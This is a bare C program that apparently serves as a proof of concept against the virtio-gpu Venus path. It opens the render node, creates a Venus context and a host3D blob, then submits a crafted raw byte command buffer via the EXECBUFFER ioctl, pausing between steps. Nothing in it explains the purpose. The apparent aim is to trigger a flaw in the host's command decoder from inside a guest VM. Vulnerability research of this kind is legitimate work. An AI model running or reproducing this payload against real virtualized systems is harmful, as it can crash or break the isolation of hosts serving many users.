#include <linux/types.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <asm/ioctl.h>

struct drm_virtgpu_context_init {
	__u32 num_params;
	__u32 pad;
	/* pointer to drm_virtgpu_context_set_param array */
	__u64 ctx_set_params;
};

struct drm_virtgpu_context_set_param {
	__u64 param;
	__u64 value;
};

struct drm_virtgpu_execbuffer {
	__u32 flags;
	__u32 size;
	__u64 command; /* void* */
	__u64 bo_handles;
	__u32 num_bo_handles;
	__s32 fence_fd; /* in/out fence fd (see VIRTGPU_EXECBUF_FENCE_FD_IN/OUT) */
	__u32 ring_idx; /* command ring index (see VIRTGPU_EXECBUF_RING_IDX) */
	__u32 pad;
};

struct drm_virtgpu_resource_create_blob {
#define VIRTGPU_BLOB_MEM_GUEST             0x0001
#define VIRTGPU_BLOB_MEM_HOST3D            0x0002
#define VIRTGPU_BLOB_MEM_HOST3D_GUEST      0x0003
#define VIRTGPU_BLOB_FLAG_USE_MAPPABLE     0x0001
#define VIRTGPU_BLOB_FLAG_USE_SHAREABLE    0x0002
#define VIRTGPU_BLOB_FLAG_USE_CROSS_DEVICE 0x0004
	/* zero is invalid blob_mem */
	__u32 blob_mem;
	__u32 blob_flags;
	__u32 bo_handle;
	__u32 res_handle;
	__u64 size;
	/*
	 * for 3D contexts with VIRTGPU_BLOB_MEM_HOST3D_GUEST and
	 * VIRTGPU_BLOB_MEM_HOST3D otherwise, must be zero.
	 */
	__u32 pad;
	__u32 cmd_size;
	__u64 cmd;
	__u64 blob_id;
};

#define DRM_IOCTL_BASE		'd'
#define DRM_IO(nr)		_IO(DRM_IOCTL_BASE,nr)
#define DRM_IOR(nr,type)	_IOR(DRM_IOCTL_BASE,nr,type)
#define DRM_IOW(nr,type)	_IOW(DRM_IOCTL_BASE,nr,type)
#define DRM_IOWR(nr,type)	_IOWR(DRM_IOCTL_BASE,nr,type)

#define DRM_COMMAND_BASE	0x40
#define DRM_VIRTGPU_EXECBUFFER  0x02
#define DRM_VIRTGPU_GETPARAM    0x03
#define DRM_VIRTGPU_GET_CAPS  0x09
#define DRM_VIRTGPU_RESOURCE_CREATE_BLOB 0x0a
#define DRM_VIRTGPU_CONTEXT_INIT 0x0b
#define VIRTGPU_EXECBUF_FLAGS  (\
		VIRTGPU_EXECBUF_FENCE_FD_IN |\
		VIRTGPU_EXECBUF_FENCE_FD_OUT |\
		VIRTGPU_EXECBUF_RING_IDX |\
		0)

#define VIRTGPU_CONTEXT_PARAM_CAPSET_ID	0x0001

#define DRM_IOCTL_VIRTGPU_EXECBUFFER \
	DRM_IOWR(DRM_COMMAND_BASE + DRM_VIRTGPU_EXECBUFFER,\
		struct drm_virtgpu_execbuffer)
#define DRM_IOCTL_VIRTGPU_GETPARAM \
	DRM_IOWR(DRM_COMMAND_BASE + DRM_VIRTGPU_GETPARAM,\
		struct drm_virtgpu_getparam)
#define DRM_IOCTL_VIRTGPU_RESOURCE_CREATE_BLOB				\
	DRM_IOWR(DRM_COMMAND_BASE + DRM_VIRTGPU_RESOURCE_CREATE_BLOB,	\
		struct drm_virtgpu_resource_create_blob)
#define DRM_IOCTL_VIRTGPU_GET_CAPS \
	DRM_IOWR(DRM_COMMAND_BASE + DRM_VIRTGPU_GET_CAPS, \
		struct drm_virtgpu_get_caps)
#define DRM_IOCTL_VIRTGPU_CONTEXT_INIT					\
	DRM_IOWR(DRM_COMMAND_BASE + DRM_VIRTGPU_CONTEXT_INIT,		\
		struct drm_virtgpu_context_init)


#define VIRGL_RENDERER_CAPSET_VENUS 4
#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))
#define drmIoctl ioctl

int main(void)
{
	int fd= open("/dev/dri/renderD128", O_RDWR | O_CLOEXEC);

	if(fd < 0)
	{
		printf("failed to open %s\n", strerror(errno));
		return -1;
	}

	struct drm_virtgpu_context_set_param ctx_set_params[1] = {
		{
			.param = VIRTGPU_CONTEXT_PARAM_CAPSET_ID,
			.value = VIRGL_RENDERER_CAPSET_VENUS,
		},
	};
	
	struct drm_virtgpu_context_init args = {
 		.num_params = ARRAY_SIZE(ctx_set_params),
		.ctx_set_params = (__u64)&ctx_set_params,
	};
	if (drmIoctl(fd, DRM_IOCTL_VIRTGPU_CONTEXT_INIT, &args))
		printf("failed to initialize context: %s\n", strerror(errno));

	struct drm_virtgpu_resource_create_blob args0 = {
		.blob_mem = VIRTGPU_BLOB_MEM_HOST3D,
		.blob_flags = VIRTGPU_BLOB_FLAG_USE_MAPPABLE,
		.blob_id = 0,
		.size = 0x1000
	};

	getchar();
	if (drmIoctl(fd, DRM_IOCTL_VIRTGPU_RESOURCE_CREATE_BLOB, &args0))
                printf("failed to create resource: %s\n", strerror(errno));

	printf("res_handle %d\n", args0.res_handle);
	void *data = "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x30\x00\x00\x00\x00\x00\x00\x15\x00\x00\x00\x00\x00\x00\x00\x00\x30\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x10\x00\x00\x00\x00\x00";
	__u32 size = 348;

	struct drm_virtgpu_execbuffer args1 = {
		.flags = 0,
		.size = size,
		.command = data,
	};
	if (drmIoctl(fd, DRM_IOCTL_VIRTGPU_EXECBUFFER, &args1))
		printf("failed to execbuffer: %s\n", strerror(errno));

	getchar();
	return 0;
}